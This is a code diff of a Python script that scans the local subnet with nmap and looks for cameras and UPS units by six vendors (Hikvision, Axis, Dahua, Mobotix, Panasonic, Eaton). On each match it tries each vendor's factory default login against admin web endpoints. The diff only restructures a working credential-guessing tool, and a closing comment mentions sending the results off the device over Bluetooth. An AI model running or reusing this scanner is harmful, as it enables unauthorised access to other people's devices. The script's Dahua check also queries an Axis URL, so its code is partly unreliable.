@@ -1,5 +1,4 @@
 import nmap
-import re
 import requests
 from requests.auth import HTTPBasicAuth
 from requests.auth import HTTPDigestAuth
@@ -8,100 +7,94 @@ import sys
 import subprocess
 
 
-# Get current host ip address
+# Get current interface ip address
 def get_ip_address():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
     return s.getsockname()[0]
 
 
-interface_ip = get_ip_address()
-
-# Convert networkIP to 0/24 subnet ip range
-network_cidr = interface_ip[:interface_ip.rfind('.') + 1] + '0/24'
-
-# tcp ports to scan for each vendor device
-ports_to_check = '21,22,23,80,81,8080'
-
-
-def network_scan(*argv):
+def network_scan():
     # save print output to text file
     with open('/tmp/output.txt', "w") as sys.stdout:
-        # scan for mac and vendor
+        # assign interface_ip to get_ip_address return value
+        interface_ip = get_ip_address()
+        # Convert networkIP to 0/24 subnet ip range
+        network_cidr = interface_ip[:interface_ip.rfind('.') + 1] + '0/24'
+        # tcp ports to scan for found vendor device
+        port_list = '21,22,23,80,81,8080'
         nm = nmap.PortScanner()
         # scan network with specified network_cidr and ports_to_check
-        nm.scan(network_cidr, ports_to_check, arguments='-sS', sudo=True)
+        nm.scan(network_cidr, port_list, arguments='-sS', sudo=True)
         for host in nm.all_hosts():
-            # searches for mac and vendors
             if 'mac' in nm[host]['addresses']:
-                target_ip = nm[host]['addresses']
-                # convert to string and strip chars for clean print
-                target_ip = str(nm[host]['addresses'])[10:-30]
-                for arg in argv:
-                    vendor = nm[host]['vendor']
-                    # find vendor name with regex
-                    vendor = re.findall(arg, str(vendor))
-                    # strip chars for clean print
-                    vendor = str(vendor)[2:][:-2]
-                    # print only devices with specified vendors in arg
-                    if arg in vendor:
+                vendor = str(nm[host]['vendor'])[23:][:-2]
+                ip = str(nm[host]['addresses'])[10:-30]
+                vendor_list = ['Mobotix AG', 'Hangzhou Hikvision Digital Technology', 'Axis Communications AB',
+                               'Zhejiang Dahua Technology', 'Panasonic Communications Co', 'Eaton']
+
+                for vendor_string in vendor_list:
+                    if vendor_string in vendor:
                         print('----------------------------------------')
-                        print(target_ip)
+                        # print vendor name
                         print(vendor)
+                        # print ip address
+                        print(ip)
+                        # print only open ports
                         for proto in nm[host].all_protocols():
                             ports = nm[host][proto].keys()
                             for port in ports:
                                 port_state = nm[host][proto][port]["state"]
                                 # only print result for open ports
                                 if port_state == 'open':
-                                    print(f'port : {port}\tstate : {port_state}')
+                                    print(f'port: {port}\tstate: {port_state}')
 
-                    def http_request(default_login, default_pw, url_location):
-                        auth_methods = [HTTPBasicAuth, HTTPDigestAuth]
-                        # try Basic and Digest auth methods, if auth success then print auth_method success
-                        for auth_method in auth_methods:
-                            try:
-                                response = requests.get(f'http://{target_ip}{url_location}',
-                                                        auth=auth_method(default_login, default_pw),
-                                                        verify=False, timeout=2.0)
-                                if response.ok:
-                                    # convert auth_method to string and strip chars
-                                    print(f'{str(auth_method)[22:][:-2]} success')
-                                    break
-                            except requests.exceptions.RequestException as e:
-                                pass
+                        # define http request function
+                        def http_request(default_login, default_pw, url_location):
+                            auth_methods = [HTTPBasicAuth, HTTPDigestAuth]
+                            # try Basic and Digest auth methods, if auth success then print auth_method success
+                            for auth_method in auth_methods:
+                                try:
+                                    response = requests.get(f'http://{ip}{url_location}',
+                                                            auth=auth_method(default_login, default_pw),
+                                                            verify=False, timeout=2.0)
 
-                    # call http_request function if device vendor name contains target vendor
-                    if vendor == 'Mobotix AG':
-                        # Mobotix: Default - admin/meinsm
-                        http_request('admin', 'meinsm', '/control/userimage.html')
+                                    if response.ok:
+                                        print(f'{str(auth_method)[22:][:-2]} success')
+                                        break
+                                except requests.exceptions.RequestException as e:
+                                    pass
 
-                    if vendor == 'Hangzhou Hikvision Digital Technology':
-                        # Hikvision: Firmware 5.3.0 and up requires unique password creation; previously admin/12345
-                        http_request('admin', '12345', '/ISAPI/System/status')
+                        # call http_request function if device vendor name contains target vendor
+                        if vendor_string == 'Mobotix AG':
+                            # Mobotix: Default - admin/meinsm
+                            http_request('admin', 'meinsm', '/control/userimage.html')
 
-                    if vendor == 'Axis Communications AB':
-                        # Axis: Traditionally root/pass, new Axis cameras require password creation during first login
-                        http_request('root', 'pass', '/axis-cgi/admin/param.cgi?action=list&group=RemoteService')
+                        if vendor_string == 'Hangzhou Hikvision Digital Technology':
+                            # Hikvision: Firmware 5.3.0 and up requires unique password creation; previously admin/12345
+                            http_request('admin', '12345', '/ISAPI/System/status')
 
-                    if vendor == 'Zhejiang Dahua Technology':
-                        # Dahua: Requires password creation on first login, older models default to admin/admin
-                        http_request('admin', 'admin', '/axis-cgi/admin/param.cgi?action=list&group=RemoteService')
+                        if vendor_string == 'Axis Communications AB':
+                            # Axis: Traditionally root/pass, new Axis cameras require password creation during first login
+                            http_request('root', 'pass', '/axis-cgi/admin/param.cgi?action=list&group=RemoteService')
 
-                    if vendor == 'Panasonic Communications Co':
-                        # Panasonic TV default user: dispadmin/@Panasonic
-                        http_request('dispadmin', '@Panasonic', '/cgi-bin/main.cgi')
+                        if vendor_string == 'Zhejiang Dahua Technology':
+                            # Dahua: Requires password creation on first login, older models default to admin/admin
+                            http_request('admin', 'admin', '/axis-cgi/admin/param.cgi?action=list&group=RemoteService')
 
-                    if vendor == 'Eaton':
-                        # Eaton UPS default user: admin/admin
-                        http_request('admin', 'admin', '/set_net.htm')
+                        if vendor_string == 'Panasonic Communications Co':
+                            # Panasonic TV default user: dispadmin/@Panasonic
+                            http_request('dispadmin', '@Panasonic', '/cgi-bin/main.cgi')
 
-        print('Scanning finished')
+                        if vendor_string == 'Eaton':
+                            # Eaton UPS default user: admin/admin
+                            http_request('admin', 'admin', '/set_net.htm')
+
+        print('Scanning finished.')
 
 
-# call function - scan network with specified vendor names
-network_scan('Mobotix AG', 'Hangzhou Hikvision Digital Technology', 'Axis Communications AB',
-             'Zhejiang Dahua Technology', 'Panasonic Communications Co', 'Eaton')
+# call function - scan network
+network_scan()
 
 # send scan results output file from RPi to remote Android device via Bluetooth
 # https://stackoverflow.com/questions/8556777/dbus-php-unable-to-launch-dbus-daemon-without-display-for-x11?rq=1
